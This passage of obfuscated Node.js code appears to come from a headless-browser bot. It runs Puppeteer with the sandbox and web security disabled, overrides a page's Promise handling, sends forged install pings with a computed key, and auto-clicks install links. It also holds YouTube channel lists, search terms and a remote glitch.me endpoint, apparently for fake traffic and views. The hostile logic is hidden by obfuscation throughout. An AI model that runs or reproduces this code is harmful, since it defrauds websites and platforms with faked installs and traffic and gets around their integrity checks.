-0x10e] = J[0xbab + 0x118c + 0x6 * -0x4dc] = 0x26d5 * -0x1 + -0x1783 + 0xbe * 0x54), J[-0x3a7 * 0x2 + 0x1b * 0x5f + -0x2a9] = this['hBytes'] << -0x1e43 + 0x1515 + 0x931 | this['bytes'] >>> 0x1 * -0x846 + -0x4be + -0x1 * -0xd21, J[-0x2 * 0x93b + 0x1a50 + -0xf * 0x85] = this['bytes'] << 0xb65 * -0x3 + -0x1 * 0x1c4f + 0x3e81, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0xceb + 0x29 * -0xc5 + 0x12b2; J < -0xd35 + -0x16bf + -0x4 * -0x911; ++J)
                K = Q[J - (-0x1 * -0x137c + 0x2 * 0x12b5 + -0x38e3 * 0x1)] ^ Q[J - (-0xebc + -0x21ec + 0x30b0)] ^ Q[J - (0x1add + 0x94 * -0x3d + -0x1 * -0x875)] ^ Q[J - (0x2 * -0x5a8 + 0x1087 * -0x1 + 0x1be7)], Q[J] = K << -0x2674 + 0x1 * -0x19f5 + -0x2035 * -0x2 | K >>> 0x1b59 + 0x51c + -0x2056 * 0x1;
              for (J = 0x4f6 + -0xc * 0x25f + -0x2 * -0xbbf; J < 0x18 * -0x1 + 0x8 * -0x498 + 0x24ec; J += 0x1d8c * -0x1 + 0x1226 + -0x1 * -0xb6b)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x21a7 + 0x1054 + -0xa * 0x4ff | L >>> -0x281 * 0xd + -0x1a89 + 0x3b31) + (M & N | ~M & O) + P + (-0x7e35ce16 + -0x283 * 0x1b6a47 + 0x8eca1c02 * 0x2) + Q[J] << -0x1fef + 0x15 * 0xe9 + 0xcd2) << -0xf5a * -0x1 + -0x2 * -0xc5e + -0x2811 | P >>> -0x192a * -0x1 + 0x7ca * -0x2 + 0x1 * -0x97b) + (L & (M = M << 0x12b5 * 0x2 + -0x2188 + -0x3c4 | M >>> 0xcbf + 0x1be2 + -0x1 * 0x289f) | ~L & N) + O + (-0x13fd6c1a + 0x58f9fb0e + -0x1 * -0x1585eaa5) + Q[J + (-0x1c65 + 0x28d + 0xd * 0x1fd)] << -0x1 * 0x136d + -0x1bf1 + -0x81 * -0x5e) << 0x663 + -0x132a + -0x5b * -0x24 | O >>> -0x78d * 0x3 + 0x4 * 0x740 + -0x63e) + (P & (L = L << -0x163f + 0xdb0 * 0x1 + 0x8ad | L >>> -0x265d + -0x2e4 * -0x5 + 0x17eb) | ~P & M) + N + (-0x2 * -0x35b1582f + 0x66c58d07 + 0x94 * -0xcef537) + Q[J + (-0xe3d + -0x1 * -0x92d + 0x512)] << 0x1817 + 0x12 * -0x3d + 0x89 * -0x25) << 0x12fc + 0x5 * 0x4a9 + -0x2a44 | N >>> 0x8bf * -0x4 + -0x1 * -0x5e2 + 0x1d35 * 0x1) + (O & (P = P << 0x4f * 0xe + -0x3b * -0x8 + -0x56 * 0x12 | P >>> 0x1082 + -0x2 * 0xe94 + -0x78 * -0x1b) | ~O & L) + M + (0x26819d8e * -0x1 + 0x88a36a7f + -0x79f5358) + Q[J + (0x518 + -0x9f4 + 0x1 * 0x4df)] << 0xf * 0x1c6 + 0x23d * -0x3 + 0x6a1 * -0x3) << 0x5d7 * 0x6 + 0x1453 + -0x284 * 0x16 | M >>> -0x27 * 0x96 + 0x7 * 0x284 + 0x559) + (N & (O = O << 0x6f1 * -0x2 + -0x35f + 0x115f | O >>> -0x1d75 + 0x4 * 0x4b + 0x1c4b) | ~N & P) + L + (0x6e4e1977 + -0x880e2b8a + 0x487 * 0x19adf4) + Q[J + (0x5 * 0x23b + 0x2a2 + 0x4b * -0x2f)] << -0x1 * -0x1857 + -0x1543 + -0x314 * 0x1, N = N << 0x13cd + -0xbb6 * -0x2 + -0x1 * 0x2b1b | N >>> -0x24b1 * -0x1 + 0xcb2 + -0x3161;
              for (; J < 0x2 * 0xac1 + -0x11e8 + 0x62 * -0x9; J += 0x5 * 0x12f + 0x27 * -0x59 + 0x1 * 0x7a9)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * -0x243 + 0x56 * -0x1f + -0x19 * -0x82 | L >>> -0x6db + 0x15d3 + 0x1 * -0xedd) + (M ^ N ^ O) + P + (0x1 * -0x14f1161 + -0x155 * 0x71a1e7 + 0x83f * 0x1ff50b) + Q[J] << -0x1818 + 0x499 + 0x137f) << 0x1 * -0x1d14 + 0xdc7 * -0x2 + 0x1 * 0x38a7 | P >>> 0x1be * 0x7 + -0x1 * -0x5d6 + 0xd * -0x161) + (L ^ (M = M << -0xe47 * 0x2 + -0x1774 + 0x3420 | M >>> -0x25ba + -0x266 + -0x3a6 * -0xb) ^ N) + O + (-0xaa0c4879 + -0x4c41ba45 + 0x3 * 0x770d4f75) + Q[J + (-0x1e71 * -0x1 + 0x1e5f * -0x1 + 0x11 * -0x1)] << -0x663 * 0x3 + 0xa * 0x2d2 + -0x90b) << 0xb * 0x32e + 0x4 * 0x2b + -0x23a1 | O >>> -0x2277 + 0x18d7 * -0x1 + 0x3b69) + (P ^ (L = L << 0x98c + 0x1149 + 0x1ab7 * -0x1 | L >>> 0x2ec * -0xb + -0x218 * -0x12 + -0x58a) ^ M) + N + (0xba899418 + -0x25 * 0xb89a92 + -0x3101515d) + Q[J + (0x1 * -0x3ff + -0x1da5 + 0x3b * 0x92)] << -0x1607 + 0x1 * 0xe6e + 0x799) << 0x99e * 0x3 + 0x2262 + -0x1 * 0x3f37 | N >>> -0x16a4 + 0x10ae + -0x1 * -0x611) + (O ^ (P = P << 0x227b + -0x9 * 0x6 + -0x2227 | P >>> -0x1444 + -0x1 * -0x1f3f + -0xaf9) ^ L) + M + (0xdcb18ebc + -0x7757f12 + -0x147a0735 * 0x5) + Q[J + (-0xfe1 + 0xcc * 0x3 + 0xd80)] << -0x81b + 0x1 * -0x8ed + 0x1108) << 0x180d * -0x1 + -0x257c + 0x3d8e | M >>> 0x2f9 * 0x1 + 0x21d * 0x1 + -0x4fb) + (N ^ (O = O << -0x2 * -0x1c4 + 0x1cb6 + -0x2020 | O >>> 0x132f + 0x29 * 0x5c + -0x1 * 0x21e9) ^ P) + L + (-0x1359ea1b + 0xf26305 * 0x61 + -0x1 * -0x265c50d7) + Q[J + (0x3 * 0xcb2 + -0x21da + -0x438)] << 0x4 * 0x7 + -0x65d + 0x641, N = N << -0x1 * -0x1d69 + -0x74f * -0x5 + -0x41d6 | N >>> -0x200d + -0x27 * 0xe3 + 0x1 * 0x42a4;
              for (; J < 0x1 * -0x6e6 + -0x1055 + 0x1777 * 0x1; J += -0x2041 + -0x1406 * 0x1 + 0x344c)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x2340 + 0x1bd3 + -0x3f0e | L >>> 0x1bf6 + -0x23 * -0x88 + 0x2f * -0xfd) + (M & N | M & O | N & O) + P - (-0x1 * 0x93962581 + -0x15494de3 * 0x5 + 0x16ee8ee14) + Q[J] << -0x4d * 0x22 + 0x4c7 + 0x573) << -0x172a + 0x582 + 0x11ad | P >>> -0x1 * -0x15ee + 0xaee + -0x20c1) + (L & (M = M << 0x113 * 0x1 + -0x5a1 + 0x4ac | M >>> 0xa26 + 0xbe9 * -0x1 + 0x1c5) | L & N | M & N) + O - (-0x449c9 * -0x13ca + -0x16ef7926 + 0x32f798b0) + Q[J + (-0x1927 + -0x2 * 0xd78 + 0x3418)] << 0x20bb + 0xf1c * -0x2 + -0x283) << 0x9a * -0xb + 0x6c * 0x3b + -0x1241 | O >>> 0x2 * -0x10c9 + 0x1eec + 0x2c1) + (P & (L = L << 0x5bf + 0x1fdf + 0x96 * -0x40 | L >>> -0x39 * -0x57 + -0xe14 + 0x7b * -0xb) | P & M | L & M) + N - (0xab5de0be + -0x148a * 0x2cab9 + -0x121e1e0) + Q[J + (0xda6 + -0x1 * -0xa2b + -0x1 * 0x17cf)] << -0x41 * 0x1d + -0x23de + 0x2b3b) << 0x1cb9 + -0x1 * -0x11ff + -0x957 * 0x5 | N >>> -0x10a3 + -0x956 + 0x1a14) + (O & (P = P << -0x16e8 + 0x8 * 0x2ff + -0xf2 * 0x1 | P >>> 0x1297 * -0x1 + -0xf27 * -0x2 + -0xbb5) | O & L | P & L) + M - (0x4 * -0x3061d889 + -0x49b33f70 + 0x17c1ee4b8) + Q[J + (-0x163 * 0xb + -0x77 * -0x11 + 0x91 * 0xd)] << -0x1 * -0x282 + 0x216d + 0x23ef * -0x1) << -0xae7 * -0x1 + -0x19fb + 0xf19 | M >>> -0x204c + 0x1 * -0x2257 + 0x215f * 0x2) + (N & (O = O << -0x99 + 0x780 + 0x6c9 * -0x1 | O >>> 0x2 * -0x86b + -0x1 * -0x167 + 0xf71) | N & P | O & P) + L - (-0xd0ec7fb8 + 0x5d6d3da1 + 0xe463853b) + Q[J + (0x60e + -0x28c + 0x12a * -0x3)] << 0x2670 + 0x1f3 * -0x2 + -0x228a, N = N << -0x1a7 + 0x26b0 + -0x1 * 0x24eb | N >>> 0x35 * -0x61 + 0x1306 * -0x2 + 0x3a23;
              for (; J < -0x3b4 + -0x1d5d + 0x2161; J += 0xa0 * 0x1e + -0x362 + -0xf59 * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x259 + 0x468 + -0x20a | L >>> -0x1ad3 + 0x1 * -0x4be + 0x7eb * 0x4) + (M ^ N ^ O) + P - (-0x2dc818e1 + 0x14d76846 + 0x4e8deec5) + Q[J] << -0x143f + -0x2 * 0x607 + 0x204d) << -0x1f * -0xc5 + -0x784 + -0x1052 | P >>> -0x4d4 + -0x61a + 0x5 * 0x235) + (L ^ (M = M << -0x2603 + 0x1d30 + 0x8f1 | M >>> -0xaad * -0x1 + -0x1 * -0x1fcb + -0x2a76) ^ N) + O - (0x1524092d + 0x4996dc * -0x130 + 0x17f8ded9 * 0x5) + Q[J + (0x1 * 0x1780 + -0xb * -0xf6 + 0x2211 * -0x1)] << 0xe95 + 0x2520 + -0xd9 * 0x3d) << 0x4c7 + -0x1 * -0x425 + -0x8e7 * 0x1 | O >>> -0x17af + -0x23ae + 0x568 * 0xb) + (P ^ (L = L << 0xf38 + 0x13 * -0x159 + 0xa81 | L >>> -0x333 + 0x16 * 0x8f + -0x915) ^ M) + N - (-0x59ba3d72 + 0x595 * -0x604e1 + 0xb0f0b791) + Q[J + (0x20 * 0xe9 + 0x191f + -0x363d * 0x1)] << 0x3 * -0xb + 0x23ec + -0x23cb * 0x1) << -0x2 * 0xa3 + 0x7c * 0x3e + -0x1cbd | N >>> -0x24ff + -0xa * -0x6b + 0x20ec) + (O ^ (P = P << -0xd * 0x89 + 0xa50 + -0x33d | P >>> 0x1276 + -0x6e6 + 0x3da * -0x3) ^ L) + M - (-0x1 * -0x25d18c7d + -0x64b0ec8e + 0x747c9e3b) + Q[J + (0xa57 + -0x45 * -0x53 + 0x1 * -0x20b3)] << -0x2617 + -0x2584 + 0x4b9b) << 0x32c + 0x5 * -0x10e + 0x21f | M >>> 0x1b6a + 0x1c56 * -0x1 + 0x107) + (N ^ (O = O << -0x10e * -0x1a + -0x11 * 0x1f0 + 0x5a2 | O >>> 0x85a + -0xf12 + -0xe * -0x7b) ^ P) + L - (0x136c0741 + 0x2947 * 0x271e7 + -0x42ba5f28) + Q[J + (-0x3 * 0x133 + -0x1a2b + 0x772 * 0x4)] << 0x1549 + -0x33 * -0x75 + -0x1 * 0x2c98, N = N << 0x40a * -0x7 + -0x8d3 + -0x1 * -0x2537 | N >>> 0x1 * -0x25e1 + -0x1 * 0x260f + 0x4bf2;
              this['h0'] = this['h0'] + L << -0x1532 + 0x20b4 + -0xb82, this['h1'] = this['h1'] + M << 0x1 * 0x137 + -0x104 * -0x15 + -0x168b, this['h2'] = this['h2'] + N << 0xd01 + -0x64 * 0xe + 0x283 * -0x3, this['h3'] = this['h3'] + O << 0x670 + 0x1 * 0x13eb + 0x8c9 * -0x3, this['h4'] = this['h4'] + P << -0x140a + 0x1 * 0x1372 + 0x98 * 0x1;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0xb * -0x2d1 + -0x19c9 + 0x2 * 0x1c70 & 0x1d3f * 0x1 + 0x7cb + -0x24fb] + w[J >> 0x6a * -0x3e + -0x1944 + 0x3308 & -0x257 + 0x24da + 0x5a * -0x62] + w[J >> -0x1 * 0x22 + 0x761 * 0x4 + 0x79 * -0x3e & 0x2586 + 0x18ca + 0x1 * -0x3e41] + w[J >> -0x2dd + 0x2579 + -0x228c & 0x1671 + 0xc2 * -0x32 + 0xf82] + w[J >> 0x84 * -0x1f + 0x53b + 0xacd & -0xe * -0x14b + -0x1187 + -0x84] + w[J >> 0x1852 + 0x4 * -0x243 + -0x1 * 0xf3e & -0x9 * -0x92 + 0x14e8 + -0x19fb] + w[J >> 0x4f * 0x14 + 0x1a83 * -0x1 + 0x145b * 0x1 & 0x1 * 0x1d57 + 0xbb2 + -0x28fa] + w[0xb08 + -0x1f84 + 0x3 * 0x6d9 & J] + w[K >> -0x8 * -0x64 + -0x1d6f + -0x1a6b * -0x1 & 0xfbe + 0x163a + -0x25e9] + w[K >> 0x4 * -0x6bf + -0xd86 + 0x289a & -0xbf * 0x7 + 0x11c5 + -0x1 * 0xc7d] + w[K >> -0x2a8 * -0x8 + 0x2d7 + -0x1803 & 0xb * -0xe2 + -0xc9c + 0x1661] + w[K >> 0xf99 * 0x2 + 0x62f * -0x5 + -0x37 & 0x9bf + -0x23c7 + -0x1 * -0x1a17] + w[K >> 0x1a85 + -0x2 * -0xa7e + -0x2f75 & -0x513 * -0x2 + 0x156 * 0x13 + -0x2379] + w[K >> 0x61 + 0x13ff + -0x5d * 0x38 & -0x112 * -0x9 + 0x1 * -0x14b1 + -0x1 * -0xb1e] + w[K >> -0xf37 + 0x75c * 0x5 + 0x1591 * -0x1 & 0x1 * 0x1c0f + 0xab9 + -0x26b9 * 0x1] + w[-0x2e2 + 0x1ea9 + -0x377 * 0x8 & K] + w[L >> 0x18 * -0x12d + -0x2 * -0x11f6 + -0x2 * 0x3cc & -0x100d + 0x23ca + 0x2 * -0x9d7] + w[L >> -0xb23 + -0x1d5d + 0x6 * 0x6c4 & -0x1 * -0x1b1c + -0x23dc + -0x29 * -0x37] + w[L >> -0xd29 + 0x43 * -0x86 + 0x95 * 0x53 & 0x24d5 + 0x77a * -0x3 + -0x9 * 0x198] + w[L >> 0x2 * 0xc82 + -0x243a + -0x5a3 * -0x2 & 0x9e3 + -0x1477 + 0xaa3] + w[L >> -0x1499 + 0xf49 * 0x2 + 0x7 * -0x16b & 0x10c * 0xa + -0x207f + 0x1616] + w[L >> -0x1 * 0x1ec6 + -0xa8 * 0x2b + 0x3b06 & 0x3a9 * -0xa + -0xf51 * -0x1 + 0x1558] + w[L >> 0x1 * 0x1089 + -0x860 + -0xf * 0x8b & -0xd58 + 0x1a6c + 0x65 * -0x21] + w[0x4 * -0x833 + -0x20fe + 0x41d9 & L] + w[M >> 0x6 * 0x46f + -0x369 + 0x13 * -0x137 & 0x10 * -0x15a + 0x6 * 0x310 + 0x34f * 0x1] + w[M >> -0x4 * -0x3f8 + 0x1 * 0x2608 + -0x11f * 0x30 & 0x1a7f + -0x1 * -0xb71 + 0x1 * -0x25e1] + w[M >> -0x3e * 0x21 + -0x1d * -0x3d + 0x1 * 0x129 & 0x6 * -0xc0 + -0x3 * 0x4cd + 0x12f6] + w[M >> -0x2315 * -0x1 + -0x119d + -0x1168 & -0x223f * -0x1 + -0x4a9 * 0x2 + -0x18de] + w[M >> 0x21a + 0x12d9 + -0x14e7 & 0x1ea1 + -0xc5b + 0x1237 * -0x1] + w[M >> -0x5 * 0x285 + -0x1 * 0x1555 + 0x21f6 & -0x24e0 + 0x18f6 + 0x265 * 0x5] + w[M >> 0x22 * -0x2f + 0x2 * 0xa85 + -0xec8 & 0x41f * 0x6 + 0x2164 + -0x1 * 0x3a0f] + w[-0x803 * 0x2 + 0x3cb * -0x1 + 0x13e0 & M] + w[N >> 0x1a8d + -0x36e + -0x1 * 0x1703 & 0x1 * -0x1ebe + -0x329 * 0x7 + -0x1 * -0x34ec] + w[N >> -0x778 * -0x5 + -0x1262 + -0x23 * 0x8a & -0xec2 + 0x4f + 0xe82] + w[N >> 0x1f0f + 0x2177 * 0x1 + 0x1 * -0x4072 & -0x129c + -0x1c1 * -0xa + -0x121 * -0x1] + w[N >> -0x2554 + -0x261d + -0x471 * -0x11 & -0x22c0 + 0x19a0 + 0x92f] + w[N >> 0x8fc + 0xf13 * -0x1 + -0x623 * -0x1 & 0x1be + -0x5c9 + 0x46 * 0xf] + w[N >> 0x4 * 0x46a + 0x1 * -0x14f3 + 0x1 * 0x353 & -0x1232 * 0x1 + 0x48 * -0x67 + 0x2f39] + w[N >> 0xd22 * 0x1 + -0x1c9d + 0xf7f & -0x2 * -0x123d + -0x1 * 0x1147 + -0x1324] + w[0x1fbd + -0x25ce * 0x1 + -0x62 * -0x10 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x5 * -0x695 + -0xc * 0x164 + 0x31b1 & 0xa4a * 0x3 + -0x7 * 0x2ef + 0x5 * -0x1de,
                J >> 0x1a45 + 0x15cb * 0x1 + 0x6 * -0x800 & -0x6 * -0x5a1 + -0x1 * -0x13dd + 0xd29 * -0x4,
                J >> -0x205c + 0xc5 * -0x17 + -0x1 * -0x3217 & 0x3ec + 0xa * -0x1d + -0x1cb * 0x1,
                -0xf95 * 0x1 + 0x3 * -0xa22 + -0x1 * -0x2efa & J,
                K >> -0x136d * 0x1 + 0x5 * -0x2c5 + 0x215e * 0x1 & 0x10c4 + -0xced * 0x3 + 0x26 * 0x9b,
                K >> -0x2343 + -0x2279 + -0x22e6 * -0x2 & -0x1 * 0xf4d + 0x1466 + -0x1 * 0x41a,
                K >> 0x1cc4 + 0x144d + -0x1 * 0x3109 & -0x1 * 0x186c + 0x17d9 + -0x192 * -0x1,
                -0x2541 + -0xce + -0x270e * -0x1 & K,
                L >> -0x1cc2 + -0x4c9 + 0x21a3 * 0x1 & 0x1 * -0xca4 + 0x1f7a + 0x11d7 * -0x1,
                L >> -0x1e97 * 0x1 + -0x91b * -0x1 + -0x1 * -0x158c & -0x255 * -0x1 + -0x17 * 0xe3 + 0x29 * 0x77,
                L >> 0x284 * -0x4 + 0x897 * 0x2 + -0x716 & -0x1b3c + 0x1 * 0x117d + 0x2 * 0x55f,
                -0x1 * -0x1d37 + -0x1 * -0x7ed + -0x13 * 0x1e7 & L,
                M >> -0x7df + 0xe0b + -0x614 & -0x53b + -0x99 + 0x1 * 0x6d3,
                M >> 0x4 * -0x187 + 0x8e9 + 0x2bd * -0x1 & 0x1 * 0x1ec9 + 0x2df * 0x2 + -0x2388,
                M >> 0xc20 + 0x4 * 0x17 + 0x63a * -0x2 & -0x2560 + -0x17f6 + 0x3e55,
                -0x2 * 0x212 + -0x296 * -0x1 + 0x28d & M,
                N >> -0x1c9a + 0x66e * 0x1 + -0x64 * -0x39 & -0xe * -0x29 + 0xda3 + -0xee2,
                N >> 0x3ae + 0x1a8f + -0x1e2d & -0x1 * -0x1de + -0x2509 * 0x1 + -0x242a * -0x1,
                N >> 0x388 + -0x8c7 + 0x547 & -0x87 * -0x19 + 0x1 * -0x181d + 0xbed,
                -0x112f + 0x3 * -0x2bd + 0x1a65 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              const T = d;
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x508 + -0x42e + 0x3 * -0x42), (K = new DataView(J))['setUint32'](-0x24 + 0x1b9 * -0x5 + 0x2eb * 0x3, this['h0']), K['setUint32'](-0x1023 + -0x74f * -0x1 + 0x236 * 0x4, this['h1']), K['setUint32'](-0xa55 * 0x1 + 0x144a + -0x9ed, this['h2']), K['setUint32'](0x19f + -0x1 * 0x62f + 0x49c, this['h3']), K[T(0x4)](0x3 * 0x6d7 + 0x1f54 + -0x33c9, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x1750 + 0x1a7 + -0x15a9 * -0x1];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x79 + -0x38f + -0x204 * -0x2;
            J[-0x7 * -0x38 + -0x4c * -0x4 + -0x2b8]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0xd88 + 0x13 * 0x92 + 0x2b2] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x26bf + -0x18c6 + -0xdf8), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x1ecb + -0x23b + 0x2107;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x9b7 + 0x2642 + -0x16af), Promise['resolve'](-0x1684 + 0x1 * 0x1163 + 0x522);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x59 * -0x15 + -0x1eeb + 0x98e * 0x4; j < 0x2ee + -0x2b4 * 0x2 + 0x27b; j++)
    i();
}
const NETWORK_PATIENCE = 0x3d66 + -0x137 * -0x21 + -0x463d + (0x251e + 0x13c4 + -0x5e * 0x7b) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x2f * 0x6d + 0x182b + -0x425) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x766 * -0x2 + -0x1 * -0x108e + 0xfad * -0x2);
    let h = e[f];
    if (b['nIypZP'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x174 + 0x11 * -0x16a + 0x1a * 0xfb, s, t, u = -0x20 * -0x62 + -0xe23 + -0x1 * -0x1e3; t = n['charAt'](u++); ~t && (s = r % (0x16 * 0x183 + -0xda7 + -0x1397) ? s * (-0x1 * -0x2216 + -0x245d + -0x287 * -0x1) + t : t, r++ % (0x22a3 + 0x1190 + -0x342f)) ? p += String['fromCharCode'](0x10f * -0x5 + -0x656 + 0xca0 & s >> (-(0x2 * -0x1237 + -0x634 * 0x1 + 0x1 * 0x2aa4) * r & -0x1097 + -0x657 * 0x1 + 0x16f4)) : 0xe42 + 0x983 + -0x17c5 * 0x1) {
          t = o['indexOf'](t);
        }
        for (let v = 0x1 * -0x11d2 + -0x6 * 0x23e + 0x1f46, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0xd03 + 0x16fc + -0x9e9))['slice'](-(0x3 * -0x45d + -0x3 * -0x260 + -0xb * -0x8b));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1 * -0x170b + 0x871 + -0x1f7c,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x2 * -0x395 + 0x5d1 * -0x6 + -0x1 * -0x2a10; u < -0x547 * -0x7 + 0x1b6e + 0x3f5f * -0x1; u++) {
          p[u] = u;
        }
        for (u = -0x6ac + 0x1 * -0xe9d + 0x1 * 0x1549; u < 0x6be + 0x2a7 + -0x865; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1652 + -0x20 * -0xc9 + -0xe7 * 0x2), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x62a + -0x93f + -0x1 * -0x315, q = 0x8b * 0x27 + -0x9d * 0x4 + -0x12b9;
        for (let v = 0xf3a * 0x1 + -0x259 * 0x2 + -0xa88; v < n['length']; v++) {
          u = (u + (0x23b4 + -0x2365 + -0x4e)) % (-0x2386 + -0x6e * -0x1d + -0x70 * -0x37), q = (q + p[u]) % (-0xc38 + 0x1 * 0x2055 + -0x131d), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x5cf + 0x1 * 0x12b9 + 0x18 * -0xfb)]);
        }
        return t;
      };
      b['slDVwB'] = m, c = arguments, b['nIypZP'] = !![];
    }
    const j = e[-0x20fd + -0x1c81 + -0x22 * -0x1cf],
      k = f + j,
      l = c[k];
    return !l ? (b['WZSZuw'] === undefined && (b['WZSZuw'] = !![]), h = b['slDVwB'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x2141 + 0x1a28 + 0x43 * -0xe3; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    const U = c;
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j[U(0x12)](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + V(0x3) + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 